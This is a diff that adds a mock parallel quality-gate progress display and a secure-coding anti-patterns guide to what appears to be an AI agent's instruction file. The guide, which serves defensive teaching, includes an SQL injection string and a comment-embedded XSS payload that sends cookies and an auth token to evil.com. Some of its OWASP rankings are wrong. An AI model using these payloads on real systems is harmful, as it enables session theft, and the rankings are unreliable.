@@ -303,6 +303,203 @@ Files changed:
 
 ---
 
+### Visual Execution Display (Show Parallel Progress)
+
+**CRITICAL: Make parallel gate execution VISIBLE with real-time progress.**
+
+```markdown
+🔍 Analyzing project phase... DETECTED: Development Phase
+📋 Orchestrating 3 quality gates in parallel...
+
+┌─────────────────────────────────────────────────┐
+│  GATE 1: Security Scanner          [▓▓▓▓▓▓░░░░] 60%  │
+│  GATE 2: Test Generator             [▓▓▓▓▓▓▓▓░░] 80%  │
+│  GATE 3: Standards Enforcer         [▓▓▓▓▓▓▓▓▓▓] 100% │
+└─────────────────────────────────────────────────┘
+
+✅ Standards Enforcer: PASSED (8.2s)
+   - 0 high-confidence issues
+   - 2 medium-confidence suggestions
+
+✅ Test Generator: PASSED (12.5s)
+   - Test coverage: 85% ✅
+   - All 4 test criteria have tests
+
+⚠️ Security Scanner: 1 MEDIUM issue found (15.1s)
+   - Input validation missing (quantity field)
+   - Risk: MEDIUM (exploitable but not critical)
+
+**Total time:** 15.1s (parallel execution)
+**Sequential would take:** 35.8s (57% faster!)
+
+---
+
+**Why I ran these gates in this order:**
+1. **Security first:** Development phase = new code = higher risk of vulnerabilities
+2. **Tests second:** Verify functionality before enforcing style preferences
+3. **Standards last:** Polish after ensuring correctness and security
+
+**Why parallel execution matters:**
+- ⏱️ **57% faster:** 15.1s vs 35.8s sequential
+- 🔄 **Better UX:** See progress across all gates simultaneously
+- 🎯 **Efficient:** No idle time waiting for gates to complete
+```
+
+---
+
+### Security Anti-Patterns (Critical Vulnerabilities to Avoid)
+
+**CRITICAL: Show concrete negative examples of security vulnerabilities.**
+
+❌ **CRITICAL: SQL Injection Vulnerability**
+
+```javascript
+// DON'T: Concatenate user input directly into SQL queries
+app.post('/login', async (req, res) => {
+  const { email } = req.body;
+
+  // VULNERABLE: String concatenation
+  const query = `SELECT * FROM users WHERE email = '${email}'`;
+  const user = await db.query(query);
+
+  // Attacker inputs: ' OR '1'='1
+  // Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1'
+  // Result: Returns ALL users (full database leak)
+});
+```
+
+**Why this is CRITICAL:**
+- 🔴 **OWASP #1** - Most common web vulnerability
+- 🔴 **Full database compromise** - Attacker reads/modifies all data
+- 🔴 **Authentication bypass** - Login as any user without password
+- 🔴 **Data exfiltration** - Steal sensitive user information
+
+✅ **CORRECT: Parameterized Queries (SQL Injection Impossible)**
+
+```javascript
+// DO: Use parameterized queries or ORM
+app.post('/login', async (req, res) => {
+  const { email } = req.body;
+
+  // SAFE: Library escapes input automatically
+  const query = 'SELECT * FROM users WHERE email = ?';
+  const user = await db.execute(query, [email]); // Library handles escaping
+
+  // OR use ORM (even safer):
+  const user = await User.findOne({ where: { email } }); // Sequelize/TypeORM
+});
+```
+
+**Pattern:** NEVER concatenate user input into SQL. Always use `?` placeholders or ORMs.
+
+---
+
+❌ **HIGH: XSS (Cross-Site Scripting)**
+
+```javascript
+// DON'T: Render user input directly as HTML
+function CommentList({ comments }) {
+  return comments.map(comment => (
+    <div dangerouslySetInnerHTML={{ __html: comment.text }} />
+    // VULNERABLE: Executes JavaScript in user comments
+  ));
+}
+
+// Attacker posts comment: "<script>
+//   fetch('https://evil.com/steal', {
+//     method: 'POST',
+//     body: JSON.stringify({
+//       cookies: document.cookie, // Steals session token
+//       localStorage: localStorage.getItem('authToken')
+//     })
+//   });
+// </script>"
+
+// Result: Malicious script executes in victim's browser, stealing credentials
+```
+
+**Why this is HIGH:**
+- 🔴 **OWASP #3** - Very common in user-generated content
+- 🔴 **Session hijacking** - Attacker steals authentication tokens
+- 🔴 **Account takeover** - Full access to victim's account
+- 🔴 **Malware delivery** - Can download malicious files
+
+✅ **CORRECT: HTML Escaping (XSS Impossible)**
+
+```javascript
+// DO: Let framework escape HTML automatically
+function CommentList({ comments }) {
+  return comments.map(comment => (
+    <div>{comment.text}</div> // React automatically escapes HTML
+    // Attacker's <script> tag becomes harmless text: "&lt;script&gt;"
+  ));
+}
+
+// OR use sanitization library for rich text:
+import DOMPurify from 'dompurify';
+
+function CommentList({ comments }) {
+  return comments.map(comment => (
+    <div dangerouslySetInnerHTML={{
+      __html: DOMPurify.sanitize(comment.text) // Removes <script> tags
+    }} />
+  ));
+}
+```
+
+**Pattern:** Assume ALL user input is malicious. Escape by default, sanitize for rich text.
+
+---
+
+❌ **MEDIUM: Authentication Bypass (Broken Access Control)**
+
+```javascript
+// DON'T: Trust client-side role checks
+app.delete('/users/:id', async (req, res) => {
+  const { id } = req.params;
+
+  // VULNERABLE: No server-side authorization check
+  await User.delete(id);
+  res.json({ success: true });
+  // Attacker can delete ANY user by changing URL parameter
+});
+```
+
+**Why this is MEDIUM:**
+- 🔴 **OWASP #2** - Broken Access Control
+- 🔴 **Privilege escalation** - Regular users can perform admin actions
+- 🔴 **Data deletion** - Unauthorized data modification
+
+✅ **CORRECT: Server-Side Authorization (Every Request)**
+
+```javascript
+// DO: Verify authorization on EVERY protected endpoint
+app.delete('/users/:id', requireAuth, async (req, res) => {
+  const { id } = req.params;
+  const currentUser = req.user; // From JWT middleware
+
+  // SAFE: Verify user can delete this resource
+  if (currentUser.role !== 'admin' && currentUser.id !== id) {
+    return res.status(403).json({ error: 'Forbidden: Cannot delete other users' });
+  }
+
+  await User.delete(id);
+  res.json({ success: true });
+});
+```
+
+**Pattern:** NEVER trust client. Validate authorization on server for every request.
+
+---
+
+**Security Mindset:**
+- 🔒 **Trust nothing from users** (all input is malicious until proven safe)
+- 🔒 **Validate on server** (client-side validation = UX only, not security)
+- 🔒 **Least privilege** (users can only access what they need)
+- 🔒 **Defense in depth** (multiple layers of security, not one check)
+
+---
+
 ### Gate Results
 
 #### Security Scanner ✅ Pass
